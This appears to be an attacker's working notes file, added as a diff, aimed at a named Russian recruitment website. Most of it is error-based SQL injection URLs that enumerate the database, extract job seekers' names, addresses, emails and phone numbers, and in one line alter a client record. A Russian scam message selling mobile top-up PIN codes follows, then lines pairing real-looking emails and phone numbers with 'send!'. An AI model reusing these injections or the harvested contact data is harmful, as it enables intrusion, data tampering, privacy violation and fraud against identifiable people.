@@ -1,0 +1,57 @@
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+convert(int,'x_+'%2bTABLE_NAME)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_NAME+NOT+IN+('AdditionEducation','BestResumes','dtproperties','Education','LastWork','Orders','Recomendations','Resumes','Sections','sysconstraints','syssegments','Vacancies','Work','Clients','ClientsImages','Codecs','ProjectResume','Projects','ProjectsImages','ProjectsResumes','Text'))--
+
+Clients
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='Clients'+AND+COLUMN_NAME+NOT+IN+('ClientId','Name','Image','Description','Order'))--
+
+(SELECT+TOP+1+convert(char(20),ContactID)+FROM+customers+WHERE+ContactID=(SELECT+MAX(ContactID)+FROM+customers))%2b'x'--
+
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+convert(int,Name)+FROM+Clients+WHERE+ClientID=(SELECT+MAX(ClientID)+FROM+Clients)-59)--
+
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=1;UPDATE+Clients+SET+Name='ГК+"Вимм+Билль+Данн"'+WHERE+ClientID=12--
+
+Orders
+
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='Orders'+AND+COLUMN_NAME+NOT+IN+('id','submitDate','company','actionDescription','address','phone','fax','email','vacancy','additionInfo','contact'))--
+
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+convert(int,company%2b'_'%2bcontact%2b'_'%2bemail%2b'_'%2bvacancy%2b'_'%2badditionInfo)+FROM+Orders+WHERE+id=126)--
+
+Resumes
+
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='Resumes'+AND+COLUMN_NAME+NOT+IN+('id','submitDate','surname','name_','patronymic','dayBirth','monthBirth','yearBirth','family','childrenNum','childrenAge','address','district','registration','phones','email','idSection','sphere','desiredVacancy','undesirable','minPaiment','trip','unlimitedDay','education','computerSkills','applications','orgTechnics','languages','driverLicence','car','military','lowStatus','hobby','sport','sportLevel','health','results','responsibility','reasons','career','strongSides','weakSides','additionInfo','workPhrase','priorityCareer','priorityHighPayment','priorityPrestige','priorityNearHome','priorityStability','prioritySocialGaranty','priorityGrouth','priorityCreative','priorityDifficalt','priorityNewKnowledge','priorityCollective','priorityUseKnowledge','search','whenBegin','pass','aboutTriza','anoverAgencies','managerRecord'))--
+
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+convert(int,surname%2b'_'%2bname_%2b'_'%2bpatronymic%2b'_'%2byearBirth%2b'_'%2baddress)+FROM+Resumes+WHERE+id=1)--
+
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+convert(int,surname%2b'_'%2bname_%2b'_'%2bpatronymic%2b'_'%2bconvert(char,yearBirth)%2b'_'%2baddress%2b'_'%2bemail%2b'_'%2bsphere%2b'_'%2bdesiredVacancy%2b'_'%2bminPaiment%2b'_'%2blanguages%2b'_'%2bresults%2b'_'%2bresponsibility%2b'_'%2breasons%2b'_'%2bcareer%2b'_'%2bstrongSides%2b'_'%2bweakSides%2b'_'%2badditionInfo%2b'_'%2bsearch%2b'_'%2banoverAgencies%2b'_'%2bconvert(int,managerRecord))+FROM+Resumes+WHERE+id=2599)--
+
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+convert(int,convert(char,submitDate)%2b'_'%2bsurname%2b'_'%2bname_%2b'_'%2bpatronymic%2b'_'%2bconvert(char,yearBirth)%2b'_'%2baddress%2b'_'%2bemail%2b'_'%2bphones%2b'_'%2bsphere%2b'_'%2bdesiredVacancy%2b'_'%2bminPaiment%2b'_'%2blanguages%2b'_'%2bstrongSides%2b'_'%2bweakSides%2b'_'%2badditionInfo%2b'_'%2bsearch%2b'_'%2banoverAgencies%2b'_'%2bconvert(int,managerRecord))+FROM+Resumes+WHERE+id=3014)--
+
+BestResumes -?
+
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='BestResumes'+AND+COLUMN_NAME+NOT+IN+('id','selected','resume'))--
+
+Vacancies
+
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='Vacancies'+AND+COLUMN_NAME+NOT+IN+('id','idSection','vacancy','description','date'))--
+
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+convert(int,vacancy%2b'_'%2bdescription%2b'_'%2bdate)+FROM+Vacancies+WHERE+id=951)--
+
+
+//СкайЛинк - 901  
+//Московская Сотовая - 901, Би (DAMPS) - тоже 901
+Префиксы gsm оператора Билайн: 903, 905, 906, 909, 960, 961, 962, 963 - Beeline.
+Префиксы gsm оператора МегаФон: 920, 923, 924, 925, 926, 927, 928, 929 - Megafon.
+Башселл: 904
+УралСвязьИнформ: 950
+
+Префиксы gsm оператора МТС: 910, 911, 912, 915, 916, 917, 919, 985 - Mts.
+
+http://www.triza.bashtorg.ru/ViewVacancies.aspx?id=(SELECT+TOP+1+min(convert(char,submitDate)%2b'_'%2bsurname%2b'_'%2bname_%2b'_'%2bpatronymic%2b'_'%2bconvert(char,yearBirth)%2b'_'%2baddress%2b'_'%2bemail%2b'_'%2bphones%2b'_'%2bsphere%2b'_'%2bdesiredVacancy%2b'_'%2bminPaiment%2b'_'%2blanguages%2b'_'%2bstrongSides%2b'_'%2bweakSides%2b'_'%2badditionInfo%2b'_'%2bsearch%2b'_'%2banoverAgencies%2b'_'%2bconvert(int,managerRecord)-1)+FROM+Resumes+WHERE+id=3059)--
+
+Плати меньше! Если твой сотовый от МТС (8-917-xxx-xx-xx), то ...
+
+Если твой сотовый от МТС (8-917-xxx-xx-xx), то у тебя есть шанс один раз немного сэкономить на оплате сотового. Для этого я продам тебе PIN-код карты экспресс-оплаты МТС за сумму, немного меньшую чем она реально стоит у оператора. Обман исключён, так как сначала я передам тебе PIN-код на твой е-мэйл inna150583@yandex.ru, а уже после этого, тебе нужно будет просто через терминал в Уфе перечислить за неё мне Яндекс.Деньги.
+Ты меня обманешь и не перечислишь за PIN-код Яндекс.Деньги? , - тогда я записываю твой е-мэйл в чёрный список и про тебя забываю.
+Если тебя заинтересовало это предложение, то ответь мне на е-мэйл sotelix@yandex.ru , что ты принимаешь это предложение, и я коротко обрисую детали оплаты в ответном письме и в нём же пришлю PIN-код.
+
+3012_inna150583@yandex.ru_8-917-75-60-588 send!
+3014_Urazmanova@yandex.ru_8-919-158-59-39 send!
